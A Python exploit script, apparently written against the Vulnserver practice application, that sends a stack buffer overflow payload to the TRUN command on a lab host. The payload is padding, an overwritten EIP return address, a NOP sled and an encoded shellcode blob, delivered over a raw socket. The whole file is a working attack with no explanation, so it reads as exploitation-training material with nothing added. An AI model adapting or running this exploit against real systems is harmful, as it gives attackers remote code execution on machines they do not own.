#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Github: sonicCrypt0r (https://github.com/sonicCrypt0r)

import socket
import struct

def main():
    RHOST = '192.168.1.70'
    RPORT = 9999

    total_length = 2984
    offset = 2003
    new_eip = struct.pack("<I", 0x62501203)
    nop_sled = b"\x90" * 16

    buf =  b""
    buf += b"\xd9\xe5\xbd\x1d\xee\x9d\x95\xd9\x74\x24\xf4\x5a"
    buf += b"\x2b\xc9\xb1\x52\x31\x6a\x17\x83\xea\xfc\x03\x77"
    buf += b"\xfd\x7f\x60\x7b\xe9\x02\x8b\x83\xea\x62\x05\x66"
    buf += b"\xdb\xa2\x71\xe3\x4c\x13\xf1\xa1\x60\xd8\x57\x51"
    buf += b"\xf2\xac\x7f\x56\xb3\x1b\xa6\x59\x44\x37\x9a\xf8"
    buf += b"\xc6\x4a\xcf\xda\xf7\x84\x02\x1b\x3f\xf8\xef\x49"
    buf += b"\xe8\x76\x5d\x7d\x9d\xc3\x5e\xf6\xed\xc2\xe6\xeb"
    buf += b"\xa6\xe5\xc7\xba\xbd\xbf\xc7\x3d\x11\xb4\x41\x25"
    buf += b"\x76\xf1\x18\xde\x4c\x8d\x9a\x36\x9d\x6e\x30\x77"
    buf += b"\x11\x9d\x48\xb0\x96\x7e\x3f\xc8\xe4\x03\x38\x0f"
    buf += b"\x96\xdf\xcd\x8b\x30\xab\x76\x77\xc0\x78\xe0\xfc"
    buf += b"\xce\x35\x66\x5a\xd3\xc8\xab\xd1\xef\x41\x4a\x35"
    buf += b"\x66\x11\x69\x91\x22\xc1\x10\x80\x8e\xa4\x2d\xd2"
    buf += b"\x70\x18\x88\x99\x9d\x4d\xa1\xc0\xc9\xa2\x88\xfa"
    buf += b"\x09\xad\x9b\x89\x3b\x72\x30\x05\x70\xfb\x9e\xd2"
    buf += b"\x77\xd6\x67\x4c\x86\xd9\x97\x45\x4d\x8d\xc7\xfd"
    buf += b"\x64\xae\x83\xfd\x89\x7b\x03\xad\x25\xd4\xe4\x1d"
    buf += b"\x86\x84\x8c\x77\x09\xfa\xad\x78\xc3\x93\x44\x83"
    buf += b"\x84\x5b\x30\x8a\x3b\x34\x43\x8c\xdc\x54\xca\x6a"
    buf += b"\x88\x44\x9b\x25\x25\xfc\x86\xbd\xd4\x01\x1d\xb8"
    buf += b"\xd7\x8a\x92\x3d\x99\x7a\xde\x2d\x4e\x8b\x95\x0f"
    buf += b"\xd9\x94\x03\x27\x85\x07\xc8\xb7\xc0\x3b\x47\xe0"
    buf += b"\x85\x8a\x9e\x64\x38\xb4\x08\x9a\xc1\x20\x72\x1e"
    buf += b"\x1e\x91\x7d\x9f\xd3\xad\x59\x8f\x2d\x2d\xe6\xfb"
    buf += b"\xe1\x78\xb0\x55\x44\xd3\x72\x0f\x1e\x88\xdc\xc7"
    buf += b"\xe7\xe2\xde\x91\xe7\x2e\xa9\x7d\x59\x87\xec\x82"
    buf += b"\x56\x4f\xf9\xfb\x8a\xef\x06\xd6\x0e\x0f\xe5\xf2"
    buf += b"\x7a\xb8\xb0\x97\xc6\xa5\x42\x42\x04\xd0\xc0\x66"
    buf += b"\xf5\x27\xd8\x03\xf0\x6c\x5e\xf8\x88\xfd\x0b\xfe"
    buf += b"\x3f\xfd\x19"

    payloadDict = {
        "prefix": b"TRUN /.:/",
        "body": b"A" * offset,
        "EIP": struct.pack("<I", 0x62501203),
        "NOPseld": b"\x90" * 16,
        "bufCode": buf,
        "fill": b"C"*(total_length - offset - len(nop_sled) - len(buf))
    }

    payload = b""
    for key in payloadDict:
        payload += payloadDict[key]

    #print(payload)
    
    s = socket.socket()
    s.connect((RHOST, RPORT))
    s.sendall(payload)
    s.close()

main()
